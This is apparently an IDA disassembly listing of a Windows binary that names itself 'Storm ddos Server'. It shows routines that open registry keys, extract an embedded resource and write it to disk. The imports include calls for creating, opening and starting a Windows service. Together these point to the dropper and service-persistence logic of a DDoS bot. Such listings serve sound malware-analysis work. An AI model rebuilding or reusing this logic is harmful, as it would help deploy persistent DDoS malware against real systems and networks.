.ax:0040234C                 repne scasb
.ax:0040234E                 not     ecx
.ax:00402350                 sub     edi, ecx
.ax:00402352                 mov     eax, ecx
.ax:00402354                 mov     esi, edi
.ax:00402356                 mov     edi, edx
.ax:00402358                 lea     edx, [esp+114h+SubKey]
.ax:0040235C                 shr     ecx, 2
.ax:0040235F                 rep movsd
.ax:00402361                 mov     ecx, eax
.ax:00402363                 xor     eax, eax
.ax:00402365                 and     ecx, 3
.ax:00402368                 rep movsb
.ax:0040236A                 mov     edi, offset ServiceName ; "Storm ddos Server"
.ax:0040236F                 or      ecx, 0FFFFFFFFh
.ax:00402372                 repne scasb
.ax:00402374                 not     ecx
.ax:00402376                 sub     edi, ecx
.ax:00402378                 mov     esi, edi
.ax:0040237A                 mov     ebx, ecx
.ax:0040237C                 mov     edi, edx
.ax:0040237E                 or      ecx, 0FFFFFFFFh
.ax:00402381                 repne scasb
.ax:00402383                 mov     ecx, ebx
.ax:00402385                 dec     edi
.ax:00402386                 shr     ecx, 2
.ax:00402389                 rep movsd
.ax:0040238B                 mov     ecx, ebx
.ax:0040238D                 lea     eax, [esp+114h+phkResult]
.ax:00402391                 and     ecx, 3
.ax:00402394                 push    eax             ; phkResult
.ax:00402395                 rep movsb
.ax:00402397                 push    0F003Fh         ; samDesired
.ax:0040239C                 lea     ecx, [esp+11Ch+SubKey]
.ax:004023A0                 push    0               ; ulOptions
.ax:004023A2                 push    ecx             ; lpSubKey
.ax:004023A3                 push    80000002h       ; hKey
.ax:004023A8                 call    ds:RegOpenKeyExA ; ADVAPI32
.ax:004023AE                 neg     eax
.ax:004023B0                 sbb     eax, eax
.ax:004023B2                 pop     edi
.ax:004023B3                 pop     esi
.ax:004023B4                 inc     eax
.ax:004023B5                 pop     ebx
.ax:004023B6                 add     esp, 108h
.ax:004023BC                 retn
.ax:004023BC sub_402320      endp
.ax:004023BC
.ax:004023BC ; ---------------------------------------------------------------------------
.ax:004023BD                 align 10h
.ax:004023C0
.ax:004023C0 ; =============== S U B R O U T I N E =======================================
.ax:004023C0
.ax:004023C0
.ax:004023C0 ; char __cdecl sub_4023C0(LPCSTR lpFileName, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite)
.ax:004023C0 sub_4023C0      proc near               ; CODE XREF: sub_402460+96↓p
.ax:004023C0
.ax:004023C0 NumberOfBytesWritten= dword ptr -10h
.ax:004023C0 var_C           = dword ptr -0Ch
.ax:004023C0 var_4           = dword ptr -4
.ax:004023C0 lpFileName      = dword ptr  4
.ax:004023C0 lpBuffer        = dword ptr  8
.ax:004023C0 nNumberOfBytesToWrite= dword ptr  0Ch
.ax:004023C0
.ax:004023C0 ; FUNCTION CHUNK AT .ax:00402860 SIZE 00000012 BYTES
.ax:004023C0
.ax:004023C0 ; __unwind { // SEH_4023C0
.ax:004023C0                 push    0FFFFFFFFh
.ax:004023C2                 push    offset SEH_4023C0
.ax:004023C7                 mov     eax, large fs:0
.ax:004023CD                 push    eax
.ax:004023CE                 mov     large fs:0, esp
.ax:004023D5                 push    ecx
.ax:004023D6                 push    esi
.ax:004023D7                 mov     eax, [esp+14h+lpFileName]
.ax:004023DB                 push    0               ; hTemplateFile
.ax:004023DD                 push    0               ; dwFlagsAndAttributes
.ax:004023DF                 push    2               ; dwCreationDisposition
.ax:004023E1                 push    0               ; lpSecurityAttributes
.ax:004023E3                 push    0               ; dwShareMode
.ax:004023E5                 push    40000000h       ; dwDesiredAccess
.ax:004023EA                 push    eax             ; lpFileName
.ax:004023EB                 call    ds:CreateFileA  ; KERNEL32
.ax:004023F1                 mov     esi, eax
.ax:004023F3                 test    esi, esi
.ax:004023F5                 jz      short loc_402439
.ax:004023F7                 mov     edx, [esp+14h+nNumberOfBytesToWrite]
.ax:004023FB                 mov     eax, [esp+14h+lpBuffer]
.ax:004023FF                 lea     ecx, [esp+14h+NumberOfBytesWritten]
.ax:00402403                 push    0               ; lpOverlapped
.ax:00402405                 push    ecx             ; lpNumberOfBytesWritten
.ax:00402406                 push    edx             ; nNumberOfBytesToWrite
.ax:00402407                 push    eax             ; lpBuffer
.ax:00402408                 push    esi             ; hFile
.ax:00402409                 call    ds:WriteFile    ; KERNEL32
.ax:0040240F                 push    esi             ; hObject
.ax:00402410                 call    ds:CloseHandle  ; KERNEL32
.ax:00402416                 lea     ecx, [esp+14h+lpFileName] ; this
.ax:0040241A                 mov     [esp+14h+var_4], 0FFFFFFFFh
.ax:00402422                 call    ??1CString@@QAE@XZ ; CString::~CString(void)
.ax:00402427                 mov     al, 1
.ax:00402429                 pop     esi
.ax:0040242A                 mov     ecx, [esp+10h+var_C]
.ax:0040242E                 mov     large fs:0, ecx
.ax:00402435                 add     esp, 10h
.ax:00402438                 retn
.ax:00402439 ; ---------------------------------------------------------------------------
.ax:00402439
.ax:00402439 loc_402439:                             ; CODE XREF: sub_4023C0+35↑j
.ax:00402439                 lea     ecx, [esp+14h+lpFileName] ; this
.ax:0040243D                 mov     [esp+14h+var_4], 0FFFFFFFFh
.ax:00402445                 call    ??1CString@@QAE@XZ ; CString::~CString(void)
.ax:0040244A                 mov     ecx, [esp+14h+var_C]
.ax:0040244E                 xor     al, al
.ax:00402450                 pop     esi
.ax:00402451                 mov     large fs:0, ecx
.ax:00402458                 add     esp, 10h
.ax:0040245B                 retn
.ax:0040245B ; } // starts at 4023C0
.ax:0040245B sub_4023C0      endp
.ax:0040245B
.ax:0040245B ; ---------------------------------------------------------------------------
.ax:0040245C                 align 10h
.ax:00402460
.ax:00402460 ; =============== S U B R O U T I N E =======================================
.ax:00402460
.ax:00402460
.ax:00402460 ; char __cdecl sub_402460(char, LPCSTR *, LPCSTR lpType)
.ax:00402460 sub_402460      proc near               ; CODE XREF: sub_401510+11A↑p
.ax:00402460                                         ; sub_401B90+98↑p ...
.ax:00402460
.ax:00402460 var_C           = dword ptr -0Ch
.ax:00402460 var_4           = dword ptr -4
.ax:00402460 arg_0           = byte ptr  4
.ax:00402460 arg_4           = dword ptr  8
.ax:00402460 lpType          = dword ptr  0Ch
.ax:00402460
.ax:00402460 ; FUNCTION CHUNK AT .ax:00402880 SIZE 0000001A BYTES
.ax:00402460
.ax:00402460 ; __unwind { // SEH_402460
.ax:00402460                 mov     eax, large fs:0
.ax:00402466                 push    0FFFFFFFFh
.ax:00402468                 push    offset SEH_402460
.ax:0040246D                 push    eax
.ax:0040246E                 mov     large fs:0, esp
.ax:00402475                 push    ebx
.ax:00402476                 push    ebp
.ax:00402477                 push    esi
.ax:00402478                 push    edi
.ax:00402479                 mov     ecx, [esp+1Ch+arg_4]
.ax:0040247D                 mov     eax, [esp+1Ch+lpType]
.ax:00402481                 and     ecx, 0FFFFh
.ax:00402487                 push    eax             ; lpType
.ax:00402488                 push    ecx             ; lpName
.ax:00402489                 push    0               ; hModule
.ax:0040248B                 mov     [esp+28h+var_4], 1
.ax:00402493                 call    ds:FindResourceA ; KERNEL32
.ax:00402499                 mov     esi, eax
.ax:0040249B                 test    esi, esi
.ax:0040249D                 jz      short loc_402509
.ax:0040249F                 push    esi             ; hResInfo
.ax:004024A0                 push    0               ; hModule
.ax:004024A2                 call    ds:SizeofResource ; KERNEL32
.ax:004024A8                 push    esi             ; hResInfo
.ax:004024A9                 push    0               ; hModule
.ax:004024AB                 mov     ebx, eax
.ax:004024AD                 call    ds:LoadResource ; KERNEL32
.ax:004024B3                 mov     esi, eax
.ax:004024B5                 test    esi, esi
.ax:004024B7                 jz      short loc_402509
.ax:004024B9                 push    ebx             ; dwBytes
.ax:004024BA                 push    40h ; '@'       ; uFlags
.ax:004024BC                 call    ds:GlobalAlloc  ; KERNEL32
.ax:004024C2                 mov     ebp, eax
.ax:004024C4                 test    ebp, ebp
.ax:004024C6                 jz      short loc_402509
.ax:004024C8                 push    esi             ; hResData
.ax:004024C9                 call    ds:LockResource ; KERNEL32
.ax:004024CF                 mov     ecx, ebx
.ax:004024D1                 mov     esi, eax
.ax:004024D3                 mov     edx, ecx
.ax:004024D5                 mov     edi, ebp
.ax:004024D7                 shr     ecx, 2
.ax:004024DA                 rep movsd
.ax:004024DC                 mov     ecx, edx
.ax:004024DE                 push    ebx             ; nNumberOfBytesToWrite
.ax:004024DF                 and     ecx, 3
.ax:004024E2                 push    ebp             ; lpBuffer
.ax:004024E3                 rep movsb
.ax:004024E5                 push    ecx             ; lpFileName
.ax:004024E6                 lea     eax, [esp+28h+arg_0]
.ax:004024EA                 mov     ecx, esp        ; this
.ax:004024EC                 mov     [esp+28h+arg_4], esp
.ax:004024F0                 push    eax             ; struct CString *
.ax:004024F1                 call    ??0CString@@QAE@ABV0@@Z ; CString::CString(CString const &)
.ax:004024F6                 call    sub_4023C0
.ax:004024FB                 add     esp, 0Ch
.ax:004024FE                 test    al, al
.ax:00402500                 push    ebp             ; hMem
.ax:00402501                 jnz     short loc_40253D
.ax:00402503                 call    ds:GlobalFree   ; KERNEL32
.ax:00402509
.ax:00402509 loc_402509:                             ; CODE XREF: sub_402460+3D↑j
.ax:00402509                                         ; sub_402460+57↑j ...
.ax:00402509                 lea     ecx, [esp+1Ch+arg_0] ; this
.ax:0040250D                 mov     byte ptr [esp+1Ch+var_4], 0
.ax:00402512                 call    ??1CString@@QAE@XZ ; CString::~CString(void)
.ax:00402517                 lea     ecx, [esp+1Ch+lpType] ; this
.ax:0040251B                 mov     [esp+1Ch+var_4], 0FFFFFFFFh
.ax:00402523                 call    ??1CString@@QAE@XZ ; CString::~CString(void)
.ax:00402528                 xor     al, al
.ax:0040252A                 mov     ecx, [esp+1Ch+var_C]
.ax:0040252E                 mov     large fs:0, ecx
.ax:00402535                 pop     edi
.ax:00402536                 pop     esi
.ax:00402537                 pop     ebp
.ax:00402538                 pop     ebx
.ax:00402539                 add     esp, 0Ch
.ax:0040253C                 retn
.ax:0040253D ; ---------------------------------------------------------------------------
.ax:0040253D
.ax:0040253D loc_40253D:                             ; CODE XREF: sub_402460+A1↑j
.ax:0040253D                 call    ds:GlobalFree   ; KERNEL32
.ax:00402543                 lea     ecx, [esp+1Ch+arg_0] ; this
.ax:00402547                 mov     byte ptr [esp+1Ch+var_4], 0
.ax:0040254C                 call    ??1CString@@QAE@XZ ; CString::~CString(void)
.ax:00402551                 lea     ecx, [esp+1Ch+lpType] ; this
.ax:00402555                 mov     [esp+1Ch+var_4], 0FFFFFFFFh
.ax:0040255D                 call    ??1CString@@QAE@XZ ; CString::~CString(void)
.ax:00402562                 mov     ecx, [esp+1Ch+var_C]
.ax:00402566                 pop     edi
.ax:00402567                 pop     esi
.ax:00402568                 pop     ebp
.ax:00402569                 mov     al, 1
.ax:0040256B                 mov     large fs:0, ecx
.ax:00402572                 pop     ebx
.ax:00402573                 add     esp, 0Ch
.ax:00402576                 retn
.ax:00402576 ; } // starts at 402460
.ax:00402576 sub_402460      endp
.ax:00402576
.ax:00402576 ; ---------------------------------------------------------------------------
.ax:00402577                 align 10h
.ax:00402580
.ax:00402580 ; =============== S U B R O U T I N E =======================================
.ax:00402580
.ax:00402580
.ax:00402580 ; int sub_402580()
.ax:00402580 sub_402580      proc near               ; DATA XREF: .data:00404004↓o
.ax:00402580
.ax:00402580 ; FUNCTION CHUNK AT .ax:004025A0 SIZE 0000000C BYTES
.ax:00402580
.ax:00402580                 call    sub_402590
.ax:00402585                 jmp     loc_4025A0
.ax:00402585 sub_402580      endp
.ax:00402585
.ax:00402585 ; ---------------------------------------------------------------------------
.ax:0040258A                 align 10h
.ax:00402590
.ax:00402590 ; =============== S U B R O U T I N E =======================================
.ax:00402590
.ax:00402590
.ax:00402590 ; int sub_402590()
.ax:00402590 sub_402590      proc near               ; CODE XREF: sub_402580↑p
.ax:00402590                 mov     ecx, 4044F9h
.ax:00402595                 jmp     ds:??0Init@ios_base@std@@QAE@XZ ; MSVCP60
.ax:00402595 sub_402590      endp
.ax:00402595
.ax:00402595 ; ---------------------------------------------------------------------------
.ax:0040259B                 align 10h
.ax:004025A0 ; START OF FUNCTION CHUNK FOR sub_402580
.ax:004025A0
.ax:004025A0 loc_4025A0:                             ; CODE XREF: sub_402580+5↑j
.ax:004025A0                 push    offset sub_4025B0 ; void (__cdecl *)()
.ax:004025A5                 call    _atexit
.ax:004025AA                 pop     ecx
.ax:004025AB                 retn
.ax:004025AB ; END OF FUNCTION CHUNK FOR sub_402580
.ax:004025AB ; ---------------------------------------------------------------------------
.ax:004025AC                 align 10h
.ax:004025B0
.ax:004025B0 ; =============== S U B R O U T I N E =======================================
.ax:004025B0
.ax:004025B0
.ax:004025B0 ; void __cdecl sub_4025B0()
.ax:004025B0 sub_4025B0      proc near               ; DATA XREF: sub_402580:loc_4025A0↑o
.ax:004025B0                 mov     ecx, 4044F9h
.ax:004025B5                 jmp     ds:??1Init@ios_base@std@@QAE@XZ ; MSVCP60
.ax:004025B5 sub_4025B0      endp
.ax:004025B5
.ax:004025B5 ; ---------------------------------------------------------------------------
.ax:004025BB                 align 10h
.ax:004025C0
.ax:004025C0 ; =============== S U B R O U T I N E =======================================
.ax:004025C0
.ax:004025C0
.ax:004025C0 ; int sub_4025C0()
.ax:004025C0 sub_4025C0      proc near               ; DATA XREF: .data:00404008↓o
.ax:004025C0
.ax:004025C0 ; FUNCTION CHUNK AT .ax:004025E0 SIZE 0000000C BYTES
.ax:004025C0
.ax:004025C0                 call    sub_4025D0
.ax:004025C5                 jmp     loc_4025E0
.ax:004025C5 sub_4025C0      endp
.ax:004025C5
.ax:004025C5 ; ---------------------------------------------------------------------------
.ax:004025CA                 align 10h
.ax:004025D0
.ax:004025D0 ; =============== S U B R O U T I N E =======================================
.ax:004025D0
.ax:004025D0
.ax:004025D0 ; int sub_4025D0()
.ax:004025D0 sub_4025D0      proc near               ; CODE XREF: sub_4025C0↑p
.ax:004025D0                 mov     ecx, 4044F8h
.ax:004025D5                 jmp     ds:??0_Winit@std@@QAE@XZ ; MSVCP60
.ax:004025D5 sub_4025D0      endp
.ax:004025D5
.ax:004025D5 ; ---------------------------------------------------------------------------
.ax:004025DB                 align 10h
.ax:004025E0 ; START OF FUNCTION CHUNK FOR sub_4025C0
.ax:004025E0
.ax:004025E0 loc_4025E0:                             ; CODE XREF: sub_4025C0+5↑j
.ax:004025E0                 push    offset sub_4025F0 ; void (__cdecl *)()
.ax:004025E5                 call    _atexit
.ax:004025EA                 pop     ecx
.ax:004025EB                 retn
.ax:004025EB ; END OF FUNCTION CHUNK FOR sub_4025C0
.ax:004025EB ; ---------------------------------------------------------------------------
.ax:004025EC                 align 10h
.ax:004025F0
.ax:004025F0 ; =============== S U B R O U T I N E =======================================
.ax:004025F0
.ax:004025F0
.ax:004025F0 ; void __cdecl sub_4025F0()
.ax:004025F0 sub_4025F0      proc near               ; DATA XREF: sub_4025C0:loc_4025E0↑o
.ax:004025F0                 mov     ecx, 4044F8h
.ax:004025F5                 jmp     ds:??1_Winit@std@@QAE@XZ ; MSVCP60
.ax:004025F5 sub_4025F0      endp
.ax:004025F5
.ax:004025F5 ; ---------------------------------------------------------------------------
.ax:004025FB                 align 10h
.ax:00402600 ; [00000006 BYTES: COLLAPSED FUNCTION CString::~CString(void)]
.ax:00402606 ; [00000006 BYTES: COLLAPSED FUNCTION operator+(CString const &,char const *)]
.ax:0040260C ; [00000006 BYTES: COLLAPSED FUNCTION CString::CString(char const *)]
.ax:00402612 ; [00000006 BYTES: COLLAPSED FUNCTION CString::operator+=(char const *)]
.ax:00402618 ; [00000006 BYTES: COLLAPSED FUNCTION CString::CString(CString const &)]
.ax:0040261E ; [00000006 BYTES: COLLAPSED FUNCTION __CxxFrameHandler]
.ax:00402624                 align 10h
.ax:00402630 ; [00000006 BYTES: COLLAPSED FUNCTION _except_handler3]
.ax:00402636 ; [0000002C BYTES: COLLAPSED FUNCTION __onexit]
.ax:00402662 ; [00000012 BYTES: COLLAPSED FUNCTION _atexit]
.ax:00402674 ; [0000015E BYTES: COLLAPSED FUNCTION start]
.ax:004027D2 ; [00000006 BYTES: COLLAPSED FUNCTION __dllonexit]
.ax:004027D8 ; [00000006 BYTES: COLLAPSED FUNCTION _XcptFilter]
.ax:004027DE ; [00000006 BYTES: COLLAPSED FUNCTION _initterm]
.ax:004027E4 ; [00000012 BYTES: COLLAPSED FUNCTION __setdefaultprecision]
.ax:004027F6
.ax:004027F6 ; =============== S U B R O U T I N E =======================================
.ax:004027F6
.ax:004027F6
.ax:004027F6 ; int __cdecl UserMathErrorFunction()
.ax:004027F6 UserMathErrorFunction proc near         ; DATA XREF: start+77↑o
.ax:004027F6                 xor     eax, eax
.ax:004027F8                 retn
.ax:004027F8 UserMathErrorFunction endp
.ax:004027F8
.ax:004027F9 ; [00000001 BYTES: COLLAPSED FUNCTION nullsub_1]
.ax:004027FA ; [00000006 BYTES: COLLAPSED FUNCTION _controlfp]
.ax:00402800 ; ---------------------------------------------------------------------------
.ax:00402800 ; START OF FUNCTION CHUNK FOR sub_401260
.ax:00402800
.ax:00402800 loc_402800:                             ; DATA XREF: .rdata:stru_4031C8↓o
.ax:00402800 ; __unwind { // SEH_401260              ; this
.ax:00402800                 lea     ecx, [ebp-98h]
.ax:00402806                 jmp     ??1CString@@QAE@XZ ; CString::~CString(void)
.ax:0040280B ; ---------------------------------------------------------------------------
.ax:0040280B
.ax:0040280B loc_40280B:                             ; DATA XREF: .rdata:004031D0↓o
.ax:0040280B                 lea     ecx, [ebp-90h]  ; this
.ax:00402811                 jmp     ??1CString@@QAE@XZ ; CString::~CString(void)
.ax:00402816 ; ---------------------------------------------------------------------------
.ax:00402816
.ax:00402816 SEH_401260:                             ; DATA XREF: sub_401260+2↑o
.ax:00402816                 mov     eax, offset stru_4031A8
.ax:0040281B                 jmp     __CxxFrameHandler
.ax:0040281B ; } // starts at 402800
.ax:0040281B ; END OF FUNCTION CHUNK FOR sub_401260
.ax:00402820 ; ---------------------------------------------------------------------------
.ax:00402820 ; START OF FUNCTION CHUNK FOR sub_401510
.ax:00402820
.ax:00402820 loc_402820:                             ; DATA XREF: .rdata:stru_4031F8↓o
.ax:00402820 ; __unwind { // SEH_401510              ; this
.ax:00402820                 mov     ecx, [ebp-218h]
.ax:00402826                 jmp     ??1CString@@QAE@XZ ; CString::~CString(void)
.ax:0040282B ; ---------------------------------------------------------------------------
.ax:0040282B
.ax:0040282B loc_40282B:                             ; DATA XREF: .rdata:00403200↓o
.ax:0040282B                 lea     ecx, [ebp-220h] ; this
.ax:00402831                 jmp     ??1CString@@QAE@XZ ; CString::~CString(void)
.ax:00402836 ; ---------------------------------------------------------------------------
.ax:00402836
.ax:00402836 SEH_401510:                             ; DATA XREF: sub_401510+2↑o
.ax:00402836                 mov     eax, offset stru_4031D8
.ax:0040283B                 jmp     __CxxFrameHandler
.ax:0040283B ; } // starts at 402820
.ax:0040283B ; END OF FUNCTION CHUNK FOR sub_401510
.ax:00402840 ; ---------------------------------------------------------------------------
.ax:00402840 ; START OF FUNCTION CHUNK FOR sub_401B90
.ax:00402840
.ax:00402840 loc_402840:                             ; DATA XREF: .rdata:stru_403228↓o
.ax:00402840 ; __unwind { // SEH_401B90              ; this
.ax:00402840                 mov     ecx, [ebp-218h]
.ax:00402846                 jmp     ??1CString@@QAE@XZ ; CString::~CString(void)
.ax:0040284B ; ---------------------------------------------------------------------------
.ax:0040284B
.ax:0040284B loc_40284B:                             ; DATA XREF: .rdata:00403230↓o
.ax:0040284B                 lea     ecx, [ebp-220h] ; this
.ax:00402851                 jmp     ??1CString@@QAE@XZ ; CString::~CString(void)
.ax:00402856 ; ---------------------------------------------------------------------------
.ax:00402856
.ax:00402856 SEH_401B90:                             ; DATA XREF: sub_401B90+2↑o
.ax:00402856                 mov     eax, offset stru_403208
.ax:0040285B                 jmp     __CxxFrameHandler
.ax:0040285B ; } // starts at 402840
.ax:0040285B ; END OF FUNCTION CHUNK FOR sub_401B90
.ax:00402860 ; ---------------------------------------------------------------------------
.ax:00402860 ; START OF FUNCTION CHUNK FOR sub_4023C0
.ax:00402860
.ax:00402860 loc_402860:                             ; DATA XREF: .rdata:stru_403258↓o
.ax:00402860 ; __unwind { // SEH_4023C0              ; this
.ax:00402860                 lea     ecx, [ebp+4]
.ax:00402863                 jmp     ??1CString@@QAE@XZ ; CString::~CString(void)
.ax:00402868 ; ---------------------------------------------------------------------------
.ax:00402868
.ax:00402868 SEH_4023C0:                             ; DATA XREF: sub_4023C0+2↑o
.ax:00402868                 mov     eax, offset stru_403238
.ax:0040286D                 jmp     __CxxFrameHandler
.ax:0040286D ; } // starts at 402860
.ax:0040286D ; END OF FUNCTION CHUNK FOR sub_4023C0
.ax:0040286D ; ---------------------------------------------------------------------------
.ax:00402872                 align 10h
.ax:00402880 ; START OF FUNCTION CHUNK FOR sub_402460
.ax:00402880
.ax:00402880 loc_402880:                             ; DATA XREF: .rdata:stru_403280↓o
.ax:00402880 ; __unwind { // SEH_402460              ; this
.ax:00402880                 lea     ecx, [ebp+0Ch]
.ax:00402883                 jmp     ??1CString@@QAE@XZ ; CString::~CString(void)
.ax:00402888 ; ---------------------------------------------------------------------------
.ax:00402888
.ax:00402888 loc_402888:                             ; DATA XREF: .rdata:00403288↓o
.ax:00402888                 lea     ecx, [ebp+4]    ; this
.ax:0040288B                 jmp     ??1CString@@QAE@XZ ; CString::~CString(void)
.ax:00402890 ; ---------------------------------------------------------------------------
.ax:00402890
.ax:00402890 SEH_402460:                             ; DATA XREF: sub_402460+8↑o
.ax:00402890                 mov     eax, offset stru_403260
.ax:00402895                 jmp     __CxxFrameHandler
.ax:00402895 ; } // starts at 402880
.ax:00402895 ; END OF FUNCTION CHUNK FOR sub_402460
.ax:00402895 ; ---------------------------------------------------------------------------
.ax:0040289A                 align 800h
.ax:0040289A _ax             ends
.ax:0040289A
.idata:00403000 ; Section 2. (virtual address 00003000)
.idata:00403000 ; Virtual size                  : 00000A98 (   2712.)
.idata:00403000 ; Section size in file          : 00001000 (   4096.)
.idata:00403000 ; Offset to raw data for section: 00003000
.idata:00403000 ; Flags 40000040: Data Readable
.idata:00403000 ; Alignment     : default
.idata:00403000 ;
.idata:00403000 ; Imports from ADVAPI32.dll
.idata:00403000 ;
.idata:00403000 ; ===========================================================================
.idata:00403000
.idata:00403000 ; Segment type: Externs
.idata:00403000 ; _idata
.idata:00403000 ; BOOL (__stdcall *CloseServiceHandle)(SC_HANDLE hSCObject)
.idata:00403000                 extrn CloseServiceHandle:dword
.idata:00403000                                         ; CODE XREF: sub_401FD0+32D↑p
.idata:00403000                                         ; sub_401FD0+338↑p
.idata:00403000                                         ; DATA XREF: ...
.idata:00403000                                         ; ADVAPI32
.idata:00403004 ; LSTATUS (__stdcall *RegOpenKeyExA)(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult)
.idata:00403004                 extrn RegOpenKeyExA:dword
.idata:00403004                                         ; CODE XREF: WinMain(x,x,x,x)+58↑p
.idata:00403004                                         ; sub_402320+88↑p
.idata:00403004                                         ; DATA XREF: ...
.idata:00403004                                         ; ADVAPI32
.idata:00403008 ; LSTATUS (__stdcall *RegQueryValueExA)(HKEY hKey, LPCSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData)
.idata:00403008                 extrn RegQueryValueExA:dword
.idata:00403008                                         ; CODE XREF: WinMain(x,x,x,x)+85↑p
.idata:00403008                                         ; DATA XREF: WinMain(x,x,x,x)+85↑r
.idata:00403008                                         ; ADVAPI32
.idata:0040300C ; BOOL (__stdcall *StartServiceCtrlDispatcherA)(const SERVICE_TABLE_ENTRYA *lpServiceStartTable)
.idata:0040300C                 extrn StartServiceCtrlDispatcherA:dword
.idata:0040300C                                         ; CODE XREF: WinMain(x,x,x,x)+281↑p
.idata:0040300C                                         ; DATA XREF: WinMain(x,x,x,x)+281↑r
.idata:0040300C                                         ; ADVAPI32
.idata:00403010 ; LSTATUS (__stdcall *RegCreateKeyA)(HKEY hKey, LPCSTR lpSubKey, PHKEY phkResult)
.idata:00403010                 extrn RegCreateKeyA:dword
.idata:00403010                                         ; CODE XREF: sub_401900+126↑p
.idata:00403010                                         ; DATA XREF: sub_401900+126↑r
.idata:00403010                                         ; ADVAPI32
.idata:00403014 ; SERVICE_STATUS_HANDLE (__stdcall *RegisterServiceCtrlHandlerA)(LPCSTR lpServiceName, LPHANDLER_FUNCTION lpHandlerProc)
.idata:00403014                 extrn RegisterServiceCtrlHandlerA:dword
.idata:00403014                                         ; CODE XREF: sub_401510+29↑p
.idata:00403014                                         ; DATA XREF: sub_401510+29↑r
.idata:00403014                                         ; ADVAPI32
.idata:00403018 ; BOOL (__stdcall *SetServiceStatus)(SERVICE_STATUS_HANDLE hServiceStatus, LPSERVICE_STATUS lpServiceStatus)
.idata:00403018                 extrn SetServiceStatus:dword
.idata:00403018                                         ; CODE XREF: sub_401510+7A↑p
.idata:00403018                                         ; sub_401510+A2↑p ...
.idata:00403018                                         ; ADVAPI32
.idata:0040301C ; LSTATUS (__stdcall *RegOpenKeyA)(HKEY hKey, LPCSTR lpSubKey, PHKEY phkResult)
.idata:0040301C                 extrn RegOpenKeyA:dword ; CODE XREF: sub_401260+B0↑p
.idata:0040301C                                         ; sub_401FD0+2D1↑p
.idata:0040301C                                         ; DATA XREF: ...
.idata:0040301C                                         ; ADVAPI32
.idata:00403020 ; LSTATUS (__stdcall *RegDeleteValueA)(HKEY hKey, LPCSTR lpValueName)
.idata:00403020                 extrn RegDeleteValueA:dword
.idata:00403020                                         ; CODE XREF: sub_401260+C0↑p
.idata:00403020                                         ; DATA XREF: sub_401260+C0↑r
.idata:00403020                                         ; ADVAPI32
.idata:00403024 ; LSTATUS (__stdcall *RegSetValueExA)(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData)
.idata:00403024                 extrn RegSetValueExA:dword
.idata:00403024                                         ; CODE XREF: sub_401260+DE↑p
.idata:00403024                                         ; sub_401900+14B↑p ...
.idata:00403024                                         ; ADVAPI32
.idata:00403028 ; LSTATUS (__stdcall *RegCloseKey)(HKEY hKey)
.idata:00403028                 extrn RegCloseKey:dword ; CODE XREF: sub_401260+E9↑p
.idata:00403028                                         ; sub_401900+156↑p ...
.idata:00403028                                         ; ADVAPI32
.idata:0040302C ; SC_HANDLE (__stdcall *OpenServiceA)(SC_HANDLE hSCManager, LPCSTR lpServiceName, DWORD dwDesiredAccess)
.idata:0040302C                 extrn OpenServiceA:dword
.idata:0040302C                                         ; CODE XREF: sub_401FD0+234↑p
.idata:0040302C                                         ; DATA XREF: sub_401FD0+234↑r
.idata:0040302C                                         ; ADVAPI32
.idata:00403030 ; SC_HANDLE (__stdcall *CreateServiceA)(SC_HANDLE hSCManager, LPCSTR lpServiceName, LPCSTR lpDisplayName, DWORD dwDesiredAccess, DWORD dwServiceType, DWORD dwStartType, DWORD dwErrorControl, LPCSTR lpBinaryPathName, LPCSTR lpLoadOrderGroup, LPDWORD lpdwTagId, LPCSTR lpDependencies, LPCSTR lpServiceStartName, LPCSTR lpPassword)
.idata:00403030                 extrn CreateServiceA:dword
.idata:00403030                                         ; CODE XREF: sub_401FD0+20E↑p
.idata:00403030                                         ; DATA XREF: sub_401FD0+20E↑r
.idata:00403030                                         ; ADVAPI32
.idata:00403034 ; SC_HANDLE (__stdcall *OpenSCManagerA)(LPCSTR lpMachineName, LPCSTR lpDatabaseName, DWORD dwDesiredAccess)
.idata:00403034                 extrn OpenSCManagerA:dword
.idata:00403034                                         ; CODE XREF: sub_401FD0+1D3↑p
.idata:00403034                                         ; DATA XREF: sub_401FD0+1D3↑r
.idata:00403034                                         ; ADVAPI32
.idata:00403038 ; BOOL (__stdcall *StartServiceA)(SC_HANDLE hService, DWORD dwNumServiceArgs, LPCSTR *lpServiceArgVectors)
.idata:00403038                 extrn StartServiceA:dword
.idata:00403038                                         ; CODE XREF: sub_401FD0+24F↑p
.idata:00403038                                         ; sub_401FD0+25A↑p
.idata:00403038                                         ; DATA XREF: ...
.idata:00403038                                         ; ADVAPI32
.idata:0040303C
.idata:00403040 ;
.idata:00403040 ; Imports from KERNEL32.dll
.idata:00403040 ;
.idata:00403040 ; LPSTR (__stdcall *lstrcatA)(LPSTR lpString1, LPCSTR lpString2)
.idata:00403040                 extrn lstrcatA:dword    ; CODE XREF: sub_401390+88↑p
.idata:00403040                                         ; sub_401390+97↑p ...
.idata:00403040                                         ; KERNEL32
.idata:00403044 ; LPSTR (__stdcall *lstrcpyA)(LPSTR lpString1, LPCSTR lpString2)
.idata:00403044                 extrn lstrcpyA:dword    ; CODE XREF: sub_401390+6F↑p
.idata:00403044                                         ; DATA XREF: sub_401390+6F↑r
.idata:00403044                                         ; KERNEL32
.idata:00403048 ; DWORD (__stdcall *GetEnvironmentVariableA)(LPCSTR lpName, LPSTR lpBuffer, DWORD nSize)
.idata:00403048                 extrn GetEnvironmentVariableA:dword
.idata:00403048                                         ; CODE XREF: sub_401390+54↑p
.idata:00403048                                         ; DATA XREF: sub_401390+54↑r
.idata:00403048                                         ; KERNEL32
.idata:0040304C ; DWORD (__stdcall *GetShortPathNameA)(LPCSTR lpszLongPath, LPSTR lpszShortPath, DWORD cchBuffer)
.idata:0040304C                 extrn GetShortPathNameA:dword
.idata:0040304C                                         ; CODE XREF: sub_401390+34↑p
.idata:0040304C                                         ; DATA XREF: sub_401390+34↑r
.idata:0040304C                                         ; KERNEL32
.idata:00403050 ; DWORD (__stdcall *GetModuleFileNameA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize)
.idata:00403050                 extrn GetModuleFileNameA:dword
.idata:00403050                                         ; CODE XREF: sub_401390+17↑p
.idata:00403050                                         ; sub_401900+B7↑p ...
.idata:00403050                                         ; KERNEL32
